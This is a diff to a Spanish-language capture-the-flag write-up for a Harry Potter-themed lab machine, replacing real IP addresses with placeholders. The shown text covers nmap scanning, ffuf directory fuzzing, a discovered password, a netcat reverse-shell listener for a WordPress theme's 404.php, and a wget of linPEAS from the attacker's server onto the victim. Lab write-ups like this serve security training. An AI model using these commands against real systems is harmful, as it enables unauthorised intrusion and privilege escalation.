@@ -39,28 +39,28 @@ Aquí veremos que esta conectado a la subred, los puerto abiertos, las paginas w
 
 Veremos que redes estan conectadas a esta subred con este comando:
 
-```nmap -sP 192.168.221.0/24```
+```nmap -sP X.X.X.0/24```
 
 Para ver los puertos abiertos que tiene la red utilizaremos este comando:
 
-```nmap -sV -sC 192.168.221.5```
+```nmap -sV -sC X.X.X.5```
 
 ### Fuzz
 
 Para fuzzear la web usaremos este comando con una wordlist que tengamos:
 
-```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.5/FUZZ```
+```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://X.X.X.5/FUZZ```
 
 > ⚠️ Importante poner FUZZ alfinal de la URL
 
 Buscando y rebuscando encontramos unas cuantas webs:
 
-* http://192.168.221.5/log
+* http://X.X.X.5/log
 ```
 #pass:OjppbGlrZXNvY2tz --> ilikesocks
 hint --> /DiagonAlley
 ```
-* http://192.168.221.5/alohomora/
+* http://X.X.X.5/alohomora/
 ```
 Draco's password is his house ;)
 ```
@@ -68,7 +68,7 @@ Draco's password is his house ;)
 
 El siguiente ffuf sera para **/DiagonAlley** y descubriremos que es un Wordpress
 
-```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://192.168.221.5/DiagonAlley/FUZZ```
+```ffuf -c -w /opt/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://X.X.X.5/DiagonAlley/FUZZ```
 
 ## Búsqueda de vulnerabilidades
 
@@ -94,7 +94,7 @@ Antes de ejecutar la url pondremos el comando para abrir el puerto puesto en la 
 
 ```rlwrap nc -nvlp 4444```
 
-La url es esta: ```http://192.168.221.5/DiagonAlley/wp-content/themes/amphibious/404.php```
+La url es esta: ```http://X.X.X.5/DiagonAlley/wp-content/themes/amphibious/404.php```
 
 Posteriormente a esto, haremos que la shell sea interactiva con este comando:
 
@@ -124,7 +124,7 @@ Para enviar el [linPEAS](https://github.com/carlospolop/privilege-escalation-awe
 
 En el **Server/Local** pondremos este comando: ```sudo python3 -m http.server 80```
 
-En el **Cliente/Remota/Victima** pondremos este comando: ```wget 192.168.221.4/linpeas.sh```
+En el **Cliente/Remota/Victima** pondremos este comando: ```wget X.X.X.4/linpeas.sh```
 
 ## Explotación de vulnerabilidades
 
